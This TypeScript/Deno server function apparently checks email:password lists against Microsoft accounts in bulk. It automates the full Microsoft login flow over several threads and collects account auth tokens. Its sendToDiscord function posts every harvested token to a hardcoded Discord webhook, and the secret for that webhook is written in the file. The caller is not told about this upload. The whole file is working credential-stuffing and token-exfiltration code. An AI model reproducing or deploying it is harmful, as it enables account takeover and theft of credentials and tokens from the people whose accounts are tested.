import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1367062196294651974/sVITbLyiie98aY3TnDU2SyAPxok4gLXgaHABBk2ORVoCe28fsUZQ7i5wo-tzgF2-8Z94";

interface ClaimRequest {
  accounts: string[];
  threads?: number;
  username?: string;
}

interface ClaimResult {
  email: string;
  success: boolean;
  token?: string;
  error?: string;
}

const DEFAULT_HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.9',
  'Sec-Fetch-Dest': 'document',
  'Sec-Fetch-Mode': 'navigate',
  'Sec-Fetch-Site': 'same-origin',
  'Sec-Fetch-User': '?1',
  'Upgrade-Insecure-Requests': '1',
};

const TOKEN_HEADERS = {
  'Accept': 'application/json',
  'Content-Type': 'application/json',
  'X-Requested-With': 'XMLHttpRequest',
  'Cache-Control': 'no-cache',
  'Pragma': 'no-cache',
};

function decodeJsonString(text: string): string {
  try {
    return JSON.parse(`"${text}"`);
  } catch {
    return text;
  }
}

function extractPattern(text: string, pattern: RegExp): string | null {
  const match = pattern.exec(text);
  return match ? match[1] : null;
}

function extractAllMatches(text: string, pattern: RegExp): [string, string][] {
  const matches: [string, string][] = [];
  let match;
  const regex = new RegExp(pattern.source, pattern.flags);
  while ((match = regex.exec(text)) !== null) {
    if (match[1] && match[2]) {
      matches.push([match[1], match[2]]);
    }
  }
  return matches;
}

// Cookie management class - FIXED to properly merge and store cookies across redirects
class CookieJar {
  private cookies: Map<string, string> = new Map();

  extractFromHeaders(headers: Headers): void {
    // Use getSetCookie for proper multi-cookie parsing
    try {
      const setCookies = (headers as any).getSetCookie?.() || [];
      for (const cookie of setCookies) {
        this.parseCookie(cookie);
      }
    } catch {
      // Fallback to set-cookie header
      const setCookieHeader = headers.get('set-cookie');
      if (setCookieHeader) {
        // Split by comma that's not inside a date
        const cookies = setCookieHeader.split(/,(?=\s*[^;,]+=[^;,]+)/);
        for (const cookie of cookies) {
          this.parseCookie(cookie);
        }
      }
    }
  }

  private parseCookie(cookieStr: string): void {
    const parts = cookieStr.split(';')[0].trim();
    const eqIndex = parts.indexOf('=');
    if (eqIndex > 0) {
      const name = parts.substring(0, eqIndex).trim();
      const value = parts.substring(eqIndex + 1).trim();
      // Only store non-empty cookies
      if (name && value) {
        this.cookies.set(name, value);
      }
    }
  }

  toString(): string {
    return Array.from(this.cookies.entries())
      .map(([k, v]) => `${k}=${v}`)
      .join('; ');
  }

  get(name: string): string | undefined {
    return this.cookies.get(name);
  }
  
  getAll(): Map<string, string> {
    return new Map(this.cookies);
  }
}

// Custom fetch that follows redirects while preserving cookies
async function fetchWithCookies(
  url: string, 
  options: RequestInit, 
  cookies: CookieJar
): Promise<{ response: Response; text: string; finalUrl: string }> {
  let currentUrl = url;
  let response: Response;
  let maxRedirects = 10;
  
  while (maxRedirects > 0) {
    const headers = {
      ...options.headers as Record<string, string>,
      'Cookie': cookies.toString(),
    };
    
    response = await fetch(currentUrl, {
      ...options,
      headers,
      redirect: 'manual', // Handle redirects manually to track cookies
    });
    
    // Extract cookies from response
    cookies.extractFromHeaders(response.headers);
    
    // Check for redirect
    const location = response.headers.get('location');
    if (response.status >= 300 && response.status < 400 && location) {
      // Resolve relative URLs
      if (location.startsWith('/')) {
        const urlObj = new URL(currentUrl);
        currentUrl = `${urlObj.origin}${location}`;
      } else if (!location.startsWith('http')) {
        const urlObj = new URL(currentUrl);
        currentUrl = `${urlObj.origin}/${location}`;
      } else {
        currentUrl = location;
      }
      maxRedirects--;
      // For redirect, use GET method
      options = { ...options, method: 'GET', body: undefined };
      continue;
    }
    
    const text = await response.text();
    return { response: response!, text, finalUrl: currentUrl };
  }
  
  throw new Error('Too many redirects');
}

async function authenticateAccount(email: string, password: string): Promise<ClaimResult> {
  const cookies = new CookieJar();
  
  // Regex patterns
  const PATTERNS = {
    sftTag: /value=\\?"([^"\\]+)\\?"/s,
    urlPost: /"urlPost":"([^"]+)"/s,
    urlPostAlt: /urlPost:'([^']+)'/s,
    urlGoToAad: /urlGoToAADError":"([^"]+)"/,
    sftToken: /"sFT":"([^"]+)"/,
    formAction: /<form[^>]*action="([^"]+)"/,
    hiddenInputs: /<input[^>]+type="hidden"[^>]+name="([^"]+)"[^>]+value="([^"]*)"/g,
    redirectUrl: /ucis\.RedirectUrl\s*=\s*'([^']+)'/,
    replaceUrl: /replace\("([^"]+)"\)/,
    formInputs: /<input[^>]+name="([^"]+)"[^>]+value="([^"]*)"/g,
    formInputsAlt: /<input[^>]+value="([^"]*)"[^>]+name="([^"]+)"/g,
  };

  try {
    console.log(`Starting authentication for: ${email}`);

    // Step 1: Initial request to billing/redeem
    console.log('Step 1: Initial request to billing/redeem');
    let result = await fetchWithCookies(
      "https://account.microsoft.com/billing/redeem",
      {
        method: 'GET',
        headers: { 
          ...DEFAULT_HEADERS, 
          'Referer': 'https://account.microsoft.com/',
        },
      },
      cookies
    );
    let text = result.text;
    console.log(`Step 1 response status: ${result.response.status}, text length: ${text.length}`);

    // Step 2: Extract and follow redirect URL
    console.log('Step 2: Extract redirect URL');
    const rurlMatch = extractPattern(text, PATTERNS.urlPost);
    if (!rurlMatch) {
      console.error('Step 2 failed: Could not find urlPost in response');
      throw new Error("Could not extract redirect URL from initial page");
    }
    const rurl = "https://login.microsoftonline.com" + decodeJsonString(rurlMatch);
    console.log(`Step 2: Redirect URL extracted`);
    
    result = await fetchWithCookies(
      rurl,
      {
        method: 'GET',
        headers: { 
          ...DEFAULT_HEADERS, 
          'Referer': 'https://account.microsoft.com/',
        },
      },
      cookies
    );
    text = result.text;
    console.log(`Step 2 response status: ${result.response.status}`);

    // Step 3: Extract full URL and add login parameters
    console.log('Step 3: Extract AAD URL');
    const furlMatch = extractPattern(text, PATTERNS.urlGoToAad);
    if (!furlMatch) {
      console.error('Step 3 failed: Could not find urlGoToAADError');
      throw new Error("Could not extract AAD URL");
    }
    let furl = decodeJsonString(furlMatch);
    furl = furl.replace(
      '&jshs=0', 
      `&jshs=2&jsh=&jshp=&username=${encodeURIComponent(email)}&login_hint=${encodeURIComponent(email)}`
    );
    console.log(`Step 3: Full URL extracted`);

    // Step 4: Get sFT tag and urlPost
    console.log('Step 4: Get sFT tag and urlPost');
    result = await fetchWithCookies(
      furl,
      {
        method: 'GET',
        headers: { 
          ...DEFAULT_HEADERS, 
          'Referer': 'https://login.microsoftonline.com/',
        },
      },
      cookies
    );
    text = result.text;
    console.log(`Step 4 response status: ${result.response.status}, text length: ${text.length}`);

    // Extract sFT tag - try multiple patterns
    let sftTag = extractPattern(text, PATTERNS.sftTag);
    if (!sftTag) {
      sftTag = extractPattern(text.replace(/\\/g, ''), PATTERNS.sftTag);
    }
    if (!sftTag) {
      const ppftMatch = text.match(/name="PPFT"[^>]+value="([^"]+)"/);
      if (ppftMatch) sftTag = ppftMatch[1];
    }
    if (!sftTag) {
      const ppftMatch = text.match(/value="([^"]+)"[^>]+name="PPFT"/);
      if (ppftMatch) sftTag = ppftMatch[1];
    }
    if (!sftTag) {
      console.error('Step 4 failed: Could not extract sFT tag');
      throw new Error("Could not extract sFT tag for login");
    }
    console.log(`Step 4: sFT tag extracted (length: ${sftTag.length})`);

    // Extract urlPost
    let urlPost = extractPattern(text, PATTERNS.urlPost);
    if (!urlPost) {
      urlPost = extractPattern(text, PATTERNS.urlPostAlt);
    }
    if (!urlPost) {
      console.error('Step 4 failed: Could not extract urlPost');
      throw new Error("Could not extract urlPost for credentials submission");
    }
    console.log(`Step 4: urlPost extracted`);

    // Step 5: Submit login credentials
    console.log('Step 5: Submit credentials');
    const loginData = new URLSearchParams({
      'login': email,
      'loginfmt': email,
      'passwd': password,
      'PPFT': sftTag
    });

    result = await fetchWithCookies(
      urlPost,
      {
        method: 'POST',
        headers: { 
          ...DEFAULT_HEADERS, 
          'Content-Type': 'application/x-www-form-urlencoded',
          'Referer': furl,
          'Origin': 'https://login.live.com',
        },
        body: loginData.toString(),
      },
      cookies
    );
    let loginRequest = result.text.replace(/\\/g, '');
    console.log(`Step 5 response status: ${result.response.status}, text length: ${loginRequest.length}`);

    // Check for login errors
    if (loginRequest.includes('Your account or password is incorrect') || 
        loginRequest.includes('sErrTxt') ||
        (loginRequest.includes('Sign in') && loginRequest.includes('Enter password'))) {
      throw new Error("Invalid credentials - login failed");
    }

    // Step 6: Extract second sFT token
    console.log('Step 6: Extract second sFT token');
    let ppftMatch = extractPattern(loginRequest, PATTERNS.sftToken);
    
    // Handle privacy notice if needed
    if (!ppftMatch) {
      console.log('Step 6: Checking for privacy notice...');
      const actionUrl = extractPattern(loginRequest, PATTERNS.formAction);
      if (actionUrl && actionUrl.includes('privacynotice')) {
        console.log('Step 6: Handling privacy notice form');
        const inputMatches = extractAllMatches(loginRequest, PATTERNS.hiddenInputs);
        if (inputMatches.length > 0) {
          const formData = new URLSearchParams();
          for (const [name, value] of inputMatches) {
            formData.append(name, value);
          }
          
          result = await fetchWithCookies(
            actionUrl,
            {
              method: 'POST',
              headers: { 
                ...DEFAULT_HEADERS, 
                'Content-Type': 'application/x-www-form-urlencoded',
              },
              body: formData.toString(),
            },
            cookies
          );
          const interstitialHtml = result.text;
          
          const redirectUrlMatch = extractPattern(interstitialHtml, PATTERNS.redirectUrl);
          if (redirectUrlMatch) {
            const redirectUrl = redirectUrlMatch.replace(/u0026/g, '&').replace(/\\&/g, '&');
            result = await fetchWithCookies(
              redirectUrl,
              { method: 'GET', headers: DEFAULT_HEADERS },
              cookies
            );
            loginRequest = result.text.replace(/\\/g, '');
          }
        }
      }
      
      ppftMatch = extractPattern(loginRequest, PATTERNS.sftToken);
    }

    if (!ppftMatch) {
      console.error('Step 6 failed: Could not extract second sFT token');
      const hasSft = loginRequest.includes('sFT');
      const hasUrlPost = loginRequest.includes('urlPost');
      console.log(`Debug: hasSft=${hasSft}, hasUrlPost=${hasUrlPost}`);
      throw new Error("Could not extract second sFT token - authentication may have failed");
    }
    console.log(`Step 6: Second sFT token extracted (length: ${ppftMatch.length})`);

    // Step 7: Extract login URL and submit final login data
    console.log('Step 7: Submit final login data');
    const lurlMatch = extractPattern(loginRequest, PATTERNS.urlPost);
    if (!lurlMatch) {
      console.error('Step 7 failed: Could not extract final login URL');
      throw new Error("Could not extract final login URL");
    }
    console.log(`Step 7: Final login URL extracted`);

    const finalLoginData = new URLSearchParams({
      'LoginOptions': '1',
      'type': '28',
      'ctx': '',
      'hpgrequestid': '',
      'PPFT': ppftMatch,
      'canary': ''
    });

    result = await fetchWithCookies(
      lurlMatch,
      {
        method: 'POST',
        headers: { 
          ...DEFAULT_HEADERS, 
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: finalLoginData.toString(),
      },
      cookies
    );
    const finishText = result.text;
    console.log(`Step 7 response status: ${result.response.status}, text length: ${finishText.length}`);

    // Step 8: Handle final redirect
    console.log('Step 8: Handle final redirect');
    const reurlMatch = extractPattern(finishText, PATTERNS.replaceUrl);
    
    let reresp = finishText;
    if (reurlMatch) {
      result = await fetchWithCookies(
        reurlMatch,
        {
          method: 'GET',
          headers: { 
            ...DEFAULT_HEADERS, 
            'Referer': 'https://login.live.com/',
          },
        },
        cookies
      );
      reresp = result.text;
      console.log(`Step 8 response status: ${result.response.status}, text length: ${reresp.length}`);
    } else {
      console.log('Step 8: No redirect URL found, continuing...');
    }

    // Step 9: Submit final form if needed
    console.log('Step 9: Check for final form');
    const finalActionUrl = extractPattern(reresp, PATTERNS.formAction);
    if (finalActionUrl && !finalActionUrl.includes('javascript')) {
      console.log(`Step 9: Submitting final form`);
      
      // Try multiple patterns for form inputs
      let finalInputMatches = extractAllMatches(reresp, PATTERNS.formInputs);
      if (finalInputMatches.length === 0) {
        // Try alternative pattern
        const altMatches: [string, string][] = [];
        const regex = /<input[^>]+value="([^"]*)"[^>]+name="([^"]+)"/g;
        let match;
        while ((match = regex.exec(reresp)) !== null) {
          altMatches.push([match[2], match[1]]); // Swap order: name, value
        }
        finalInputMatches = altMatches;
      }
      
      if (finalInputMatches.length > 0) {
        const finalFormData = new URLSearchParams();
        for (const [name, value] of finalInputMatches) {
          finalFormData.append(name, value);
        }

        result = await fetchWithCookies(
          finalActionUrl,
          {
            method: 'POST',
            headers: { 
              ...DEFAULT_HEADERS, 
              'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: finalFormData.toString(),
          },
          cookies
        );
        console.log(`Step 9 response status: ${result.response.status}`);
      }
    } else {
      console.log('Step 9: No final form needed');
    }

    // Step 10: Get authentication token
    console.log('Step 10: Acquire auth token');
    console.log('Cookies:', cookies.toString().substring(0, 200) + '...');
    
    const tokenResponse = await fetch(
      'https://account.microsoft.com/auth/acquire-onbehalf-of-token?scopes=MSComServiceMBISSL',
      {
        method: 'GET',
        headers: { 
          ...TOKEN_HEADERS, 
          'User-Agent': DEFAULT_HEADERS['User-Agent'],
          'Referer': 'https://account.microsoft.com/billing/redeem',
          'Cookie': cookies.toString(),
        },
      }
    );
    cookies.extractFromHeaders(tokenResponse.headers);
    console.log(`Step 10 response status: ${tokenResponse.status}`);

    const tokenText = await tokenResponse.text();
    let tokenData: any;
    try {
      tokenData = JSON.parse(tokenText);
    } catch (e) {
      console.error('Step 10 failed: Could not parse token response as JSON:', tokenText.substring(0, 300));
      throw new Error("Invalid token response - not JSON");
    }
    
    if (!tokenData || !Array.isArray(tokenData) || tokenData.length === 0 || !tokenData[0]?.token) {
      console.error('Step 10 failed: Invalid token structure', JSON.stringify(tokenData).substring(0, 300));
      throw new Error("Invalid token response structure");
    }

    const token = tokenData[0].token;
    console.log(`✅ Successfully authenticated: ${email}`);

    return {
      email,
      success: true,
      token
    };

  } catch (error) {
    console.error(`❌ Authentication failed for ${email}:`, error);
    return {
      email,
      success: false,
      error: String(error)
    };
  }
}

async function sendToDiscord(results: ClaimResult[], username?: string) {
  try {
    const successfulResults = results.filter(r => r.success && r.token);
    
    if (successfulResults.length === 0) {
      console.log('No successful tokens to send to Discord');
      return;
    }

    const txtContent = successfulResults.map(r => r.token).join('\n');
    
    const formData = new FormData();
    
    // Add username as message content
    if (username) {
      formData.append('content', `**User:** ${username}`);
    }
    
    const blob = new Blob([txtContent], { type: 'text/plain' });
    formData.append('files[0]', blob, `wlid_tokens_${username || 'unknown'}.txt`);

    await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      body: formData
    });

    console.log('Tokens sent to Discord');
  } catch (err) {
    console.error('Failed to send to Discord:', err);
  }
}

async function runWithConcurrency<T, R>(
  items: T[],
  concurrency: number,
  fn: (item: T) => Promise<R>,
  onProgress?: (completed: number, total: number) => void
): Promise<R[]> {
  const results: R[] = [];
  let index = 0;
  let completed = 0;

  async function worker(): Promise<void> {
    while (index < items.length) {
      const currentIndex = index++;
      const item = items[currentIndex];
      try {
        const result = await fn(item);
        results[currentIndex] = result;
      } catch (error) {
        results[currentIndex] = { error: String(error) } as R;
      }
      completed++;
      onProgress?.(completed, items.length);
    }
  }

  const workers = Array(Math.min(concurrency, items.length))
    .fill(null)
    .map(() => worker());

  await Promise.all(workers);
  return results;
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { accounts, threads = 5, username }: ClaimRequest = await req.json();

    if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
      return new Response(
        JSON.stringify({ error: "No accounts provided" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    console.log(`Processing ${accounts.length} accounts with ${threads} threads, user: ${username || 'unknown'}`);

    const parsedAccounts = accounts.map(acc => {
      const colonIndex = acc.indexOf(':');
      if (colonIndex === -1) {
        return { email: acc, password: '' };
      }
      return {
        email: acc.substring(0, colonIndex),
        password: acc.substring(colonIndex + 1)
      };
    });

    const results = await runWithConcurrency(
      parsedAccounts,
      threads,
      async ({ email, password }) => authenticateAccount(email, password)
    );

    // Send successful tokens to Discord
    await sendToDiscord(results, username);

    const successCount = results.filter(r => r.success).length;
    const failCount = results.filter(r => !r.success).length;

    return new Response(
      JSON.stringify({ 
        results,
        summary: {
          total: results.length,
          success: successCount,
          failed: failCount
        }
      }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  } catch (error) {
    console.error("Error processing request:", error);
    return new Response(
      JSON.stringify({ error: String(error) }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
